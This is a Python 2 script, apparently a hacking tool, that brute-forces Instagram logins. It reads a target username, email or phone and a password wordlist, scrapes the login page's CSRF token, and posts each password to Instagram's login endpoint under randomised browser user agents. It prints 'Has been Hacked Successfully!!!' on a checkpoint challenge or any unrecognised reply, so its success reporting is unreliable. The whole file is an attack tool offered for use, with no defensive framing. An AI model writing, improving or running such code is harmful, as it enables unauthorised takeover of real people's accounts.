#!/usr/bin/env python
# -*- coding: UTF-8 -*-

from bs4 import BeautifulSoup
import json
import random
import re
import requests
import os

W = '\033[1;37;40m'
Br = '\033[1;31;40m'
Bg = '\033[1;32;40m'
Y = '\033[1;33;40m'
Bb = '\033[1;34;40m'
Bm = '\033[1;35;40m'
Bc = '\033[1;36;40m'
print(Bb+"""
 ___           _                                  
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___  
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \ 
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/                     
""")


BASE_URL = 'https://www.instagram.com/accounts/login/'
LOGIN_URL = BASE_URL + 'ajax/'

headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"
        ]


email = str(raw_input("Email or Phone or User Name : "))
passwordlist = str(raw_input("Wordlist Path : "))
USER_AGENT = headers_list[random.randrange(0,4)]

session = requests.Session()
session.headers = {'user-agent': USER_AGENT}
session.headers.update({'Referer': BASE_URL})    
req = session.get(BASE_URL)    
soup = BeautifulSoup(req.content, 'html.parser')    
body = soup.find('body')

pattern = re.compile('window._sharedData')
script = body.find("script", text=pattern)

script = script.get_text().replace('window._sharedData = ', '')[:-1]
data = json.loads(script)

csrf = data['config'].get('csrf_token')
passwords = open(passwordlist,"r")
for password in passwords:
    password = password.replace("\n","")
    login_data = {'username': email, 'password': password}
    session.headers.update({'X-CSRFToken': csrf})
    login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
    log = login.content
    if "challenge" in log:
        os.system("clear")
        print(Br+"We Detected An Unusual Login Attempt")
        print(Br+"To secure your account, we'll send you a security code to verify your identity.")
        print (log)
        print 
        print(Bg +"\n\n[+] Email/Phone: " + email + " Password: {}".format(password)) + W
        print Bg + "[+] " + email + " Has been Hacked Successfully!!!" + W
        break
    elif "authenticated" in log:
        print(Br+"This password is wrong : "+Y+password)
    else:
        print(Bg +"\n\n[+] Email/Phone: " + email + " Password: {}".format(password)) + W
        print Bg + "[+] " + email + " Has been Hacked Successfully!!!" + W
        break
